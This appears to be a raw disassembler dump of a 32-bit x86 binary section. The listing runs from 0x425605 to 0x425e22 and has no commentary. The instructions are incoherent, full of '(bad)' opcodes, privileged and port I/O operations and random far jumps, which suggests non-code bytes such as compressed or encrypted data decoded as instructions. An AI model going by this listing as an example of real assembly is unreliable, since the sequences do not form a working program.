  425605:	lds    esi,FWORD PTR [edx-0x69]
  425608:	jb     0x425663
  42560a:	test   al,0x72
  42560c:	sbb    cl,dl
  42560e:	ds call 0x722c:0xba8a052
  425616:	inc    ebx
  425617:	sbb    eax,0x22f0b30b
  42561c:	inc    esp
  42561d:	inc    edi
  42561e:	inc    esi
  42561f:	iret   
  425620:	xor    al,0x5c
  425622:	jns    0x425645
  425624:	mov    bh,0xea
  425626:	repz retw 0x1d96
  42562b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42562c:	xchg   DWORD PTR [ecx],edx
  42562e:	inc    esp
  42562f:	jno    0x4255d8
  425631:	jns    0x4256b0
  425633:	inc    ecx
  425634:	adc    al,0x49
  425636:	mov    bh,0xf4
  425638:	adc    al,0x53
  42563a:	inc    ebp
  42563b:	jb     0x425643
  42563d:	stos   DWORD PTR es:[edi],eax
  42563e:	push   ecx
  42563f:	jmp    0x3e9b7b2b
  425644:	adc    BYTE PTR [esi+0x1703ed7e],0xda
  42564b:	xchg   ebp,eax
  42564c:	mov    ds:0xf8a69e44,eax
  425651:	xchg   edi,eax
  425652:	jmp    0x4256a8
  425654:	sar    BYTE PTR [esi+0x3b12f396],0x66
  42565b:	sub    bl,dh
  42565d:	cld    
  42565e:	dec    ebp
  42565f:	call   0x9f7bf658
  425664:	fisttp DWORD PTR [esi-0x27]
  425667:	cli    
  425668:	nop
  425669:	pop    ds
  42566a:	inc    ecx
  42566b:	cli    
  42566c:	mov    ebp,0xa7d50ab0
  425671:	xchg   edi,eax
  425672:	iret   
  425673:	retf   
  425674:	int3   
  425675:	in     al,0x5c
  425677:	adc    eax,DWORD PTR [edx+0xdeafd5a]
  42567d:	adc    BYTE PTR [edi],cl
  42567f:	jns    0x4256c7
  425681:	in     eax,dx
  425682:	push   esi
  425683:	rcl    DWORD PTR [ebp-0x65],1
  425686:	enter  0xb13c,0x97
  42568a:	and    BYTE PTR [edx],dl
  42568c:	inc    si
  42568e:	shl    DWORD PTR [esi],cl
  425690:	xchg   edi,eax
  425691:	dec    edx
  425692:	inc    esp
  425693:	mov    bl,BYTE PTR [ecx]
  425695:	data16 mov ds:0x67ac1c4,al
  42569b:	in     al,0x77
  42569d:	cli    
  42569e:	ret    0x8064
  4256a1:	dec    eax
  4256a2:	stos   BYTE PTR es:[edi],al
  4256a3:	pop    esp
  4256a4:	loop   0x42562a
  4256a6:	xchg   DWORD PTR [ebx+eiz*1],edi
  4256a9:	rol    cl,0x97
  4256ac:	mov    bl,0x2
  4256ae:	mov    DWORD PTR [eax],ebp
  4256b0:	pop    edi
  4256b1:	daa    
  4256b2:	pop    edx
  4256b3:	add    DWORD PTR [eax],edx
  4256b5:	ds inc esp
  4256b7:	xlat   BYTE PTR ds:[ebx]
  4256b8:	add    DWORD PTR [esi],ecx
  4256ba:	mov    esi,0xb9ab4da8
  4256bf:	add    BYTE PTR [edx+0xd],dh
  4256c2:	adc    BYTE PTR [esi+0x1493a32d],0xe6
  4256c9:	cld    
  4256ca:	jmp    0x42565d
  4256cc:	jmp    0x42567e
  4256ce:	adc    DWORD PTR [edx-0x5c],0xffffff9c
  4256d2:	xor    BYTE PTR [esi-0x50],bl
  4256d5:	cs adc eax,0xa8422694
  4256db:	sub    eax,0xeea791b8
  4256e0:	cmp    ah,BYTE PTR [ebx]
  4256e2:	in     eax,0xf3
  4256e4:	int    0xd4
  4256e6:	dec    ecx
  4256e7:	rcr    BYTE PTR [esi+0x6fc5b625],cl
  4256ed:	stc    
  4256ee:	scas   eax,DWORD PTR es:[edi]
  4256ef:	pop    ebp
  4256f0:	sbb    dh,cl
  4256f2:	sbb    DWORD PTR [ecx],ebp
  4256f4:	aas    
  4256f5:	adc    edi,DWORD PTR [ebx-0x2a2495e0]
  4256fb:	mov    edx,0xdce4bba9
  425700:	loope  0x42573d
  425702:	popf   
  425703:	ret    
  425704:	jg     0x42572c
  425706:	add    eax,0x923ab9ef
  42570b:	(bad)  
  42570d:	rcr    BYTE PTR [ebx],cl
  42570f:	ror    BYTE PTR [esi-0x1],1
  425712:	and    dh,BYTE PTR [ecx+eax*8-0x42]
  425716:	loopne 0x42574a
  425718:	imul   eax,DWORD PTR [esi+0x4896f485],0x2f
  42571f:	adc    bh,0x3e
  425722:	js     0x42579c
  425724:	add    bl,BYTE PTR [ebp-0x5d]
  425727:	sub    eax,0x2b1373cf
  42572c:	mov    ebx,0x9837a7fd
  425731:	push   ecx
  425732:	stos   DWORD PTR es:[edi],eax
  425733:	mov    ecx,0x29958d9a
  425738:	mov    cl,0xec
  42573a:	es (bad) 
  42573c:	das    
  42573d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42573e:	dec    ebx
  42573f:	in     al,dx
  425740:	imul   eax,DWORD PTR [edx+0x7773b721],0x90fe43e5
  42574a:	adc    BYTE PTR [edi],0x14
  42574d:	cmp    BYTE PTR [edi],al
  42574f:	jmp    0x4256d7
  425751:	out    dx,al
  425752:	dec    esp
  425753:	cmp    DWORD PTR [eax+0x311a2605],edi
  425759:	in     al,dx
  42575a:	iret   
  42575b:	aad    0xe9
  42575d:	ss push 0x42405ff6
  425763:	out    dx,al
  425764:	ficomp DWORD PTR [ebp+0x2b]
  425767:	cs push esp
  425769:	pop    ss
  42576a:	daa    
  42576b:	(bad)  [edi-0x18]
  42576e:	xor    BYTE PTR [edi+0x51],cl
  425771:	xor    al,0x70
  425773:	mov    DWORD PTR [ecx+ecx*8-0x595d7196],ecx
  42577a:	jmp    0xa353093b
  42577f:	ds pop esi
  425781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425782:	into   
  425783:	sbb    eax,0xa016baa
  425788:	ret    0xae75
  42578b:	add    esi,DWORD PTR [ecx]
  42578d:	dec    esi
  42578e:	es jecxz 0x42579b
  425791:	outs   dx,BYTE PTR ds:[esi]
  425792:	cwde   
  425793:	(bad)  
  425794:	fadd   QWORD PTR [esp+ebx*8+0x17]
  425798:	add    dl,BYTE PTR [esi-0x37bcff3]
  42579e:	out    dx,al
  42579f:	scas   al,BYTE PTR es:[edi]
  4257a0:	xor    ebx,edi
  4257a2:	or     ebp,edi
  4257a4:	mov    DWORD PTR [esi],ecx
  4257a6:	add    BYTE PTR [esi-0x6f],bl
  4257a9:	fsin   
  4257ab:	cli    
  4257ac:	or     DWORD PTR [ebx-0x45e36676],edx
  4257b2:	data16 (bad) 
  4257b4:	(bad)  
  4257b5:	xchg   esp,eax
  4257b6:	sub    ah,dh
  4257b8:	pop    es
  4257b9:	jecxz  0x4257d5
  4257bb:	ja     0x425784
  4257bd:	xchg   ebx,eax
  4257be:	add    bl,BYTE PTR [edi+ecx*8+0x3e078018]
  4257c5:	mov    dl,0xfc
  4257c7:	push   edi
  4257c8:	dec    ecx
  4257c9:	jbe    0x4257e5
  4257cb:	pop    ds
  4257cc:	xchg   edi,eax
  4257cd:	jge    0x425832
  4257cf:	add    ecx,DWORD PTR [edi-0x633d19c2]
  4257d5:	add    al,0x41
  4257d7:	jecxz  0x42579b
  4257d9:	(bad)  
  4257db:	test   BYTE PTR [esi],dl
  4257dd:	cmc    
  4257de:	xchg   BYTE PTR [eax-0x58aad1e9],cl
  4257e4:	jb     0x4257b5
  4257e6:	shl    edx,1
  4257e8:	add    al,0x5e
  4257ea:	jl     0x42583a
  4257ec:	pusha  
  4257ed:	in     eax,0xf7
  4257ef:	fwait
  4257f0:	jnp    0x42578a
  4257f2:	repz jo 0x42577b
  4257f5:	scas   al,BYTE PTR es:[edi]
  4257f6:	xlat   BYTE PTR ds:[ebx]
  4257f7:	mov    bh,0x24
  4257f9:	jb     0x425828
  4257fb:	mov    esp,0x350a26e9
  425800:	jbe    0x4257f2
  425802:	mov    esp,0xf2d4be13
  425807:	dec    esp
  425808:	xlat   BYTE PTR ds:[ebx]
  425809:	les    esp,FWORD PTR [esi]
  42580b:	inc    esi
  42580c:	stc    
  42580d:	jecxz  0x4257a0
  42580f:	sbb    bh,BYTE PTR [esi-0x2a]
  425812:	(bad)  
  425813:	lock push edi
  425815:	mov    esi,0x22b98f86
  42581a:	loopne 0x4257cc
  42581c:	ja     0x425857
  42581e:	xchg   BYTE PTR [eax],bh
  425820:	dec    esp
  425821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425822:	mov    cl,0x3f
  425824:	jp     0x425821
  425826:	out    dx,al
  425827:	xor    DWORD PTR [esp+esi*2-0xc82a49c],ecx
  42582e:	loope  0x425835
  425830:	or     esp,DWORD PTR [ecx+0x3a0009c6]
  425836:	aas    
  425837:	sub    DWORD PTR [eax+0x4b],ebx
  42583a:	(bad)  [edi+0x63dc8707]
  425840:	sbb    esi,eax
  425842:	sub    ecx,DWORD PTR [edi]
  425844:	cmp    edx,DWORD PTR ss:[edx]
  425847:	xor    al,0xe4
  425849:	outs   dx,BYTE PTR ds:[esi]
  42584a:	dec    edx
  42584b:	adc    al,0x74
  42584d:	pop    ds
  42584e:	adc    BYTE PTR [edi],cl
  425850:	aam    0xf4
  425852:	aam    0x3e
  425854:	sbb    eax,0xf189e1af
  425859:	retf   
  42585a:	push   0x67
  42585c:	mov    ah,0x26
  42585e:	lea    ebp,[eax+0x68]
  425861:	and    BYTE PTR [ebx-0x2a],dl
  425864:	sbb    BYTE PTR [eax],ah
  425866:	mov    ebp,0xd5707bc5
  42586b:	std    
  42586c:	sbb    BYTE PTR [eax],bh
  42586e:	push   ss
  42586f:	cdq    
  425870:	sbb    dl,BYTE PTR [edx+0x3914d255]
  425876:	sbb    al,BYTE PTR [edi]
  425878:	iret   
  425879:	in     al,dx
  42587a:	cli    
  42587b:	pop    ecx
  42587c:	add    ch,BYTE PTR [edx+0x26fa5aa3]
  425882:	and    bl,BYTE PTR [eax]
  425884:	inc    edi
  425885:	adc    al,0xda
  425887:	mov    bh,0xd3
  425889:	mov    esp,0x6e3611b2
  42588e:	push   edi
  42588f:	pop    edi
  425890:	pop    eax
  425891:	jg     0x4258ed
  425893:	(bad)  
  425894:	scas   al,BYTE PTR es:[edi]
  425895:	adc    ah,ch
  425897:	nop
  425898:	sub    ch,dl
  42589a:	es jp  0x425909
  42589d:	fnstcw WORD PTR [ecx+0x42]
  4258a0:	mov    al,ds:0xddb29955
  4258a5:	and    eax,0x64350d04
  4258aa:	xor    eax,edi
  4258ac:	ss scas eax,DWORD PTR es:[edi]
  4258ae:	mov    al,ds:0x839bea73
  4258b3:	je     0x425844
  4258b5:	cmc    
  4258b6:	and    DWORD PTR [edx],ebx
  4258b8:	jg     0x4258ff
  4258ba:	or     BYTE PTR [eax],ch
  4258bc:	imul   esp,edx,0xffffffce
  4258bf:	inc    edx
  4258c0:	xchg   ebp,eax
  4258c1:	adc    ecx,DWORD PTR [edi+edi*4-0x11a6d7ae]
  4258c8:	and    ebx,DWORD PTR ss:[ecx-0x1]
  4258cc:	scas   al,BYTE PTR es:[edi]
  4258cd:	addr16 jb 0x425900
  4258d0:	cmp    DWORD PTR [edx],0x3c
  4258d3:	mov    cl,0xd3
  4258d5:	(bad)  
  4258d6:	aas    
  4258d7:	jae    0x425895
  4258d9:	sub    al,0xc0
  4258db:	xor    al,0x30
  4258dd:	in     al,0x8a
  4258df:	out    dx,al
  4258e0:	pop    edx
  4258e1:	loopne 0x425929
  4258e3:	mov    bl,0x1f
  4258e5:	sub    al,0xd7
  4258e7:	outs   dx,BYTE PTR gs:[esi]
  4258e9:	cmp    BYTE PTR [ebx-0x4e36fff1],dh
  4258ef:	inc    esp
  4258f0:	cmp    BYTE PTR [edx+0x2e],0xdc
  4258f4:	inc    ebp
  4258f5:	and    BYTE PTR [eax],bh
  4258f7:	cdq    
  4258f8:	pop    edi
  4258f9:	adc    dl,BYTE PTR [esp+esi*1]
  4258fc:	lods   al,BYTE PTR ds:[esi]
  4258fd:	lahf   
  4258fe:	aas    
  4258ff:	xchg   ebx,eax
  425900:	xor    eax,0x19925808
  425905:	cld    
  425906:	adc    eax,0xb380f475
  42590b:	test   eax,0x5b583361
  425910:	out    dx,eax
  425911:	sbb    BYTE PTR [edx+0x7c7ca3a8],bh
  425917:	into   
  425918:	cmp    dh,al
  42591a:	inc    edi
  42591b:	inc    esp
  42591c:	sbb    DWORD PTR [edx+0x57],0xd93bafe8
  425923:	sub    bh,al
  425925:	xlat   BYTE PTR ds:[ebx]
  425926:	mov    bl,0xb2
  425928:	sub    eax,0x9596f5
  42592d:	in     eax,dx
  42592e:	retf   
  42592f:	outs   dx,DWORD PTR ds:[esi]
  425930:	pop    ds
  425931:	pop    ecx
  425932:	paddsw mm4,QWORD PTR [esi-0x42f96142]
  425939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42593a:	jl     0x42594c
  42593c:	sbb    dh,BYTE PTR [edx-0x40]
  42593f:	loope  0x425947
  425941:	icebp  
  425942:	pop    ebx
  425943:	inc    ecx
  425944:	fs cmp ch,bl
  425947:	into   
  425948:	(bad)  
  425949:	jno    0x4259a5
  42594b:	push   ebp
  42594c:	outs   dx,DWORD PTR ds:[esi]
  42594d:	ficom  WORD PTR [ebx+0x7f]
  425950:	ss ret 
  425952:	lds    edx,FWORD PTR ss:[edi]
  425955:	mov    cl,0xb7
  425957:	cmp    ebx,ebp
  425959:	call   0x179e:0x94c344c1
  425960:	fidiv  DWORD PTR [edx]
  425962:	ss retf 0x7a54
  425966:	ds test al,0x8d
  425969:	mov    ecx,0xefd9941d
  42596e:	nop
  42596f:	pop    es
  425970:	outs   dx,DWORD PTR ds:[esi]
  425971:	in     eax,dx
  425972:	clc    
  425973:	xchg   esp,eax
  425974:	jecxz  0x4259f4
  425976:	and    BYTE PTR [ebp+ebp*1+0x19],0xe4
  42597b:	scas   eax,DWORD PTR es:[edi]
  42597c:	clc    
  42597d:	jge    0x425988
  42597f:	scas   eax,DWORD PTR es:[edi]
  425980:	call   0xd4cc3dd1
  425985:	test   al,0x54
  425987:	dec    esi
  425988:	jl     0x4259cf
  42598a:	add    BYTE PTR [ebp+0x50],dh
  42598d:	shl    BYTE PTR [edi],1
  42598f:	cmp    eax,0x3a888bcd
  425994:	inc    edx
  425995:	sub    al,0xb
  425997:	or     al,0x7e
  425999:	repz adc eax,0x66140216
  42599f:	repz das 
  4259a1:	dec    edi
  4259a2:	clc    
  4259a3:	fwait
  4259a4:	mov    bl,0xa8
  4259a6:	ror    DWORD PTR [ebp+ebx*8+0x2a2860dc],1
  4259ad:	sub    BYTE PTR [eax+ebp*2+0x6ca498ab],ch
  4259b4:	jg     0x425a1a
  4259b6:	jae    0x4259a9
  4259b8:	ja     0x4259c8
  4259ba:	pop    eax
  4259bb:	icebp  
  4259bc:	xor    eax,0x9ad15f13
  4259c1:	test   bh,ah
  4259c3:	les    ebp,FWORD PTR [edx]
  4259c5:	add    eax,0x45281bab
  4259ca:	arpl   WORD PTR [ebx-0x68],bp
  4259cd:	push   eax
  4259ce:	cmc    
  4259cf:	pop    es
  4259d0:	push   0xffffff81
  4259d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259d3:	add    ebx,edx
  4259d5:	jb     0x425a32
  4259d7:	lods   al,BYTE PTR ds:[esi]
  4259d8:	pop    ebp
  4259d9:	cmp    DWORD PTR [ecx+0x30c7f51d],esp
  4259df:	adc    ebp,ebx
  4259e1:	int    0xd8
  4259e3:	mov    bl,dl
  4259e5:	sti    
  4259e6:	dec    ecx
  4259e7:	jl     0x425a1e
  4259e9:	arpl   WORD PTR [esi-0x24],si
  4259ec:	push   edx
  4259ed:	aam    0xb4
  4259ef:	das    
  4259f0:	mov    ebp,ebx
  4259f2:	xchg   esp,eax
  4259f3:	add    DWORD PTR [ecx+0x459b70c4],ebp
  4259f9:	mov    esi,0x9979d4ab
  4259fe:	push   ss
  4259ff:	cmp    eax,0x1191f817
  425a04:	and    bl,0xab
  425a07:	and    dl,BYTE PTR [ebx]
  425a09:	outs   dx,DWORD PTR ds:[esi]
  425a0a:	add    BYTE PTR [edi],bh
  425a0c:	mov    eax,ds:0x10bd3e9e
  425a11:	xlat   BYTE PTR fs:[ebx]
  425a13:	scas   al,BYTE PTR es:[edi]
  425a14:	mov    ebx,0x6cddb4b0
  425a19:	xchg   ebx,eax
  425a1a:	mov    ch,0x12
  425a1c:	cmp    BYTE PTR [edi+ebp*4],dh
  425a1f:	pop    edi
  425a20:	test   eax,0x39184694
  425a25:	dec    edx
  425a26:	dec    ebp
  425a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a28:	sub    BYTE PTR [ebx-0x2f],dl
  425a2b:	mov    edx,0xaab3e113
  425a30:	pop    ebx
  425a31:	xchg   ebx,eax
  425a32:	std    
  425a33:	repnz mov ecx,0xb9544411
  425a39:	mul    ebx
  425a3b:	and    eax,0x886c4272
  425a40:	mov    BYTE PTR [ebp+0xb4eb1a6],ch
  425a46:	cli    
  425a47:	call   0xf27:0x404e30a3
  425a4e:	cmp    eax,DWORD PTR [ebx]
  425a50:	or     al,0xc4
  425a52:	hlt    
  425a53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a54:	(bad)  
  425a55:	cld    
  425a56:	mov    esp,0x53c87a3f
  425a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a5c:	push   eax
  425a5d:	loopne 0x4259f7
  425a5f:	lock scas eax,DWORD PTR es:[edi]
  425a61:	lahf   
  425a62:	jbe    0x4259eb
  425a64:	jecxz  0x425aa1
  425a66:	loopne 0x425ad5
  425a68:	lock inc eax
  425a6a:	mov    ch,0x9d
  425a6c:	xchg   edi,eax
  425a6d:	adc    al,0xe
  425a6f:	xchg   esi,eax
  425a70:	ins    BYTE PTR es:[edi],dx
  425a71:	mov    eax,0x47bd69d7
  425a76:	mov    ebx,0x591758cd
  425a7b:	mov    ebp,0x5e01c425
  425a80:	pushf  
  425a81:	and    ch,BYTE PTR [edi]
  425a83:	(bad)  
  425a84:	mov    esp,0x2ba209ff
  425a89:	mov    dl,0x36
  425a8b:	inc    ecx
  425a8c:	(bad)  
  425a8d:	xchg   BYTE PTR [edi-0x55],al
  425a90:	sti    
  425a91:	pop    ebp
  425a92:	cmp    al,0xed
  425a94:	iret   
  425a95:	lods   al,BYTE PTR ds:[esi]
  425a96:	scas   al,BYTE PTR es:[edi]
  425a97:	inc    esi
  425a98:	mov    eax,0xbf904fcc
  425a9d:	mov    cl,0x13
  425a9f:	lea    esi,[ecx+0x15]
  425aa2:	out    dx,eax
  425aa3:	and    eax,0xd78d7b1c
  425aa8:	or     BYTE PTR [ecx+0x22],0xcd
  425aac:	jns    0x425b1f
  425aae:	inc    eax
  425aaf:	pop    esp
  425ab0:	iret   
  425ab1:	sahf   
  425ab2:	test   eax,0xd6a01eaa
  425ab7:	and    eax,0xfd721197
  425abc:	push   eax
  425abd:	outs   dx,DWORD PTR ds:[esi]
  425abe:	ret    
  425abf:	rol    bl,cl
  425ac1:	stos   DWORD PTR es:[edi],eax
  425ac2:	out    dx,eax
  425ac3:	fdiv   DWORD PTR [esi]
  425ac5:	sar    DWORD PTR [ebp+eiz*4+0x41],cl
  425ac9:	test   DWORD PTR [eax],edx
  425acb:	jno    0x425ae2
  425acd:	add    ebx,DWORD PTR [ebx-0x3ee30692]
  425ad3:	ror    BYTE PTR [esi],0x27
  425ad6:	mov    dh,0xf7
  425ad8:	test   BYTE PTR [eax+0x54],bl
  425adb:	pop    esp
  425adc:	aaa    
  425add:	fs (bad) 
  425adf:	ss or  al,0x45
  425ae2:	add    ecx,DWORD PTR [ecx-0x4]
  425ae5:	pop    ebp
  425ae6:	call   0xcb26:0x71eb1c49
  425aed:	lds    edx,FWORD PTR [eax]
  425aef:	loop   0x425b2f
  425af1:	stos   BYTE PTR es:[edi],al
  425af2:	les    ebx,FWORD PTR [ebx+ebx*8-0x2f29c60f]
  425af9:	stos   DWORD PTR es:[edi],eax
  425afa:	jle    0x425b07
  425afc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425afd:	sbb    eax,esi
  425aff:	cli    
  425b00:	adc    eax,0x5c27cf78
  425b05:	push   edx
  425b06:	add    esi,ebp
  425b08:	pop    ecx
  425b09:	lods   al,BYTE PTR ds:[esi]
  425b0a:	outs   dx,DWORD PTR ds:[esi]
  425b0b:	lds    ecx,FWORD PTR [esi+0x3a0b150a]
  425b11:	adc    DWORD PTR [ebx+0x1a98d0e0],0x87eb3cb0
  425b1b:	mov    edi,ss
  425b1d:	xor    edx,DWORD PTR [ecx-0x66244244]
  425b23:	nop
  425b24:	clc    
  425b25:	test   BYTE PTR [esi+0x377f123c],cl
  425b2b:	test   BYTE PTR [ebx+0x53],al
  425b2e:	sbb    DWORD PTR [ebx-0x1f],ebx
  425b31:	sub    BYTE PTR [ebx],bh
  425b33:	cmp    DWORD PTR [eax+0x1a863103],0xc90844e7
  425b3d:	cmp    al,0x52
  425b3f:	and    esi,DWORD PTR [edi-0x6e]
  425b42:	addr16 test eax,0xa5a0f334
  425b48:	dec    BYTE PTR [ecx-0x7066346e]
  425b4e:	jmp    0xced1:0x2a3ff4ac
  425b55:	and    eax,0x7e72fc1
  425b5a:	xlat   BYTE PTR ds:[ebx]
  425b5b:	fisubr WORD PTR [esp+ebp*1]
  425b5e:	loop   0x425b4c
  425b60:	enter  0xcc7,0x21
  425b64:	push   esi
  425b65:	push   esi
  425b66:	ins    BYTE PTR es:[edi],dx
  425b67:	(bad)  
  425b68:	cmp    BYTE PTR [ebx+0x38fc375a],cl
  425b6e:	push   ebx
  425b6f:	sbb    BYTE PTR ds:0xf06f4d67,0xac
  425b76:	lock cmp eax,0x4d340f2a
  425b7c:	push   0x8e74b5c1
  425b81:	push   edx
  425b82:	int3   
  425b83:	fs dec ebx
  425b85:	xchg   ebx,eax
  425b86:	fst    DWORD PTR [eax+0x3101cd8c]
  425b8c:	retf   
  425b8d:	adc    edi,DWORD PTR [edi+ecx*8+0x7147d5b8]
  425b94:	call   0x1873:0x25320a5
  425b9b:	and    dl,ah
  425b9d:	les    eax,FWORD PTR [eax+0x6ac8e803]
  425ba3:	out    dx,al
  425ba4:	mov    ds:0x7f4bf184,eax
  425ba9:	mov    bh,BYTE PTR [ecx+0x5e1b556a]
  425baf:	push   ds
  425bb0:	nop
  425bb1:	xor    ah,BYTE PTR [ecx-0x2b3511bf]
  425bb7:	dec    edi
  425bb8:	mov    dh,0x53
  425bba:	xchg   esp,eax
  425bbb:	icebp  
  425bbc:	push   0x5c
  425bbe:	ret    
  425bbf:	lods   al,BYTE PTR ds:[esi]
  425bc0:	into   
  425bc1:	cdq    
  425bc2:	dec    esi
  425bc3:	dec    edx
  425bc4:	std    
  425bc5:	out    dx,al
  425bc6:	adc    cl,BYTE PTR [edx+0x218945cc]
  425bcc:	lods   eax,DWORD PTR ds:[esi]
  425bcd:	retf   
  425bce:	ret    
  425bcf:	imul   BYTE PTR [eax+0x5d]
  425bd2:	adc    ebx,esp
  425bd4:	mov    eax,0x7b4de5b5
  425bd9:	or     bl,al
  425bdb:	xor    eax,0x49ca1d95
  425be0:	xor    dl,BYTE PTR [eax]
  425be2:	(bad)  
  425be4:	mov    edx,0x1419b9c7
  425be9:	popf   
  425bea:	test   al,0xa9
  425bec:	sbb    eax,0x3776c1f6
  425bf1:	das    
  425bf2:	fcom   DWORD PTR [edi+0x2ab00625]
  425bf8:	pop    esi
  425bf9:	test   eax,0xf36c8a2c
  425bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bff:	mov    al,ds:0x4549c7d9
  425c04:	pop    esp
  425c05:	push   esp
  425c06:	out    dx,al
  425c07:	mov    ch,0x5b
  425c09:	pop    edx
  425c0a:	jp     0x425c60
  425c0c:	enter  0xec08,0xa0
  425c10:	pop    DWORD PTR [edx+0x71de9d2b]
  425c16:	cmp    bl,bl
  425c18:	push   ds
  425c19:	retf   0x571
  425c1c:	push   eax
  425c1d:	adc    BYTE PTR [ebx+0x19],bh
  425c20:	inc    ebp
  425c21:	add    eax,0x93f0515e
  425c26:	jne    0x425bf7
  425c28:	pop    ebx
  425c29:	test   ch,0x86
  425c2c:	dec    ebp
  425c2d:	adc    al,0xbb
  425c2f:	iret   
  425c30:	mov    al,ds:0x30b9c613
  425c35:	mov    ah,0xa9
  425c37:	push   ss
  425c38:	jns    0x425c75
  425c3a:	retf   0x7247
  425c3d:	sbb    edx,DWORD PTR [eax-0x55]
  425c40:	push   ds
  425c41:	sbb    edi,ecx
  425c43:	mov    esp,esp
  425c45:	pop    esp
  425c46:	lods   eax,DWORD PTR ds:[esi]
  425c47:	jmp    0x425bea
  425c49:	mov    eax,ds:0x7161ab5d
  425c4e:	fsub   QWORD PTR [esi+0x19]
  425c51:	xchg   esi,eax
  425c52:	les    edi,FWORD PTR [edi]
  425c54:	mov    bh,0x55
  425c56:	mov    edx,0x676137c2
  425c5b:	sbb    eax,0x2027fa8b
  425c60:	dec    DWORD PTR [ebp-0x2214e8f3]
  425c66:	push   ebx
  425c67:	xor    DWORD PTR [esi-0x7e3d87e8],ecx
  425c6d:	or     ebp,DWORD PTR [edi-0x5e8f7f5c]
  425c73:	retf   
  425c74:	call   0x9443a18c
  425c79:	js     0x425c9c
  425c7b:	cmp    BYTE PTR [eax+0x2074c9dd],bh
  425c81:	push   ebx
  425c82:	mov    ?,WORD PTR [edi+0x62771aae]
  425c88:	pushf  
  425c89:	jae    0x425c28
  425c8b:	adc    edi,edx
  425c8d:	add    ebp,esi
  425c8f:	and    BYTE PTR [edi+0x25],0x76
  425c93:	jecxz  0x425cc5
	...
  425d11:	add    BYTE PTR [eax],al
  425d13:	add    dh,ah
  425d15:	rcl    BYTE PTR [ecx+esi*8-0x2818084c],cl
  425d1c:	aad    0x75
  425d1e:	(bad)  
  425d1f:	adc    DWORD PTR [esi+esi*2+0x2a],esp
  425d23:	sbb    esi,ebx
  425d25:	out    dx,al
  425d26:	add    DWORD PTR [eax],eax
  425d28:	imul   eax,DWORD PTR [edi],0x5f5f0000
  425d2e:	mov    bh,0x12
  425d30:	inc    ebx
  425d31:	adc    ebp,DWORD PTR [ebp-0x2a]
  425d34:	cwde   
  425d35:	jg     0x425d7b
  425d37:	outs   dx,BYTE PTR ds:[esi]
  425d38:	das    
  425d39:	xor    al,BYTE PTR [ebx-0x57]
  425d3c:	inc    esp
  425d3d:	fidiv  DWORD PTR [ebx+ebp*4+0x3ba6408d]
  425d44:	mov    ds:0x3034a542,eax
  425d49:	or     al,0xbe
  425d4b:	rol    dh,cl
  425d4d:	mov    cl,0x18
  425d4f:	jno    0x425d12
  425d51:	mov    edi,0xe8142a57
  425d56:	sti    
  425d57:	inc    esi
  425d58:	shl    cl,cl
  425d5a:	adc    BYTE PTR [ebp-0xeef6283],bh
  425d60:	xor    DWORD PTR [ebx+0x7b7d62fa],edi
  425d66:	sar    DWORD PTR [eax-0x50],cl
  425d69:	mov    esp,0x2bfc2f14
  425d6e:	mov    esp,0x3f3f3d28
  425d73:	mov    BYTE PTR [edi],ch
  425d75:	aad    0x1f
  425d77:	and    eax,0x64765e54
  425d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d7d:	xor    BYTE PTR [esi+0x2ed065ea],bh
  425d83:	pop    esi
  425d84:	push   ds
  425d85:	dec    ecx
  425d86:	cmc    
  425d87:	mov    ds,WORD PTR [edx+0x53]
  425d8a:	(bad)  
  425d8b:	push   eax
  425d8c:	fdiv   DWORD PTR [ecx+0x58]
  425d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d90:	call   0x538:0x5ac70274
  425d97:	(bad)  
  425d98:	xchg   esp,eax
  425d99:	nop
  425d9a:	loopne 0x425d6b
  425d9c:	or     bh,BYTE PTR [ebp+0x32]
  425d9f:	pop    esp
  425da0:	xchg   ebx,eax
  425da1:	clc    
  425da2:	sar    BYTE PTR [eax-0x53],0x5d
  425da6:	imul   ecx,DWORD PTR [eax+0x6320b770],0x27
  425dad:	mov    esi,0x925bd8f5
  425db2:	xchg   esp,eax
  425db3:	xchg   esi,eax
  425db4:	pop    ebx
  425db5:	mov    esi,DWORD PTR ds:0x26021a07
  425dbb:	mov    ds:0x38d51b59,al
  425dc0:	pop    DWORD PTR [edi-0xaa1065]
  425dc6:	xlat   BYTE PTR ds:[ebx]
  425dc7:	aaa    
  425dc8:	scas   eax,DWORD PTR es:[edi]
  425dc9:	add    al,0x6a
  425dcb:	lock mov dh,BYTE PTR [eax+esi*2]
  425dcf:	pop    es
  425dd0:	push   0x62
  425dd2:	pop    eax
  425dd3:	xor    esp,DWORD PTR [eax-0x3aed0a7c]
  425dd9:	cs out dx,eax
  425ddb:	loope  0x425db7
  425ddd:	enter  0x1789,0xc9
  425de1:	dec    ecx
  425de2:	retf   0xeeba
  425de5:	jmp    0x425e41
  425de7:	lds    esp,FWORD PTR [esi]
  425de9:	addr16 lahf 
  425deb:	mov    ah,0xf3
  425ded:	fist   DWORD PTR [eax+ecx*8]
  425df0:	xchg   ebp,eax
  425df1:	sar    esi,cl
  425df3:	mov    ebp,0x76c48fca
  425df8:	inc    ebp
  425df9:	inc    eax
  425dfa:	enter  0x4c6e,0xd9
  425dfe:	mov    ah,0x33
  425e00:	lods   eax,DWORD PTR ds:[esi]
  425e01:	push   es
  425e02:	add    ah,BYTE PTR [edx]
  425e04:	movntps XMMWORD PTR [ebx+0x711c4784],xmm4
  425e0b:	rcl    BYTE PTR [edx+eax*8+0x5df790be],1
  425e12:	lods   al,BYTE PTR ds:[esi]
  425e13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e14:	sar    BYTE PTR gs:0xc3b206e,1
  425e1b:	push   es
  425e1c:	adc    DWORD PTR [ebx-0x2c637f1a],esp
  425e22:	xchg   ebx,eax
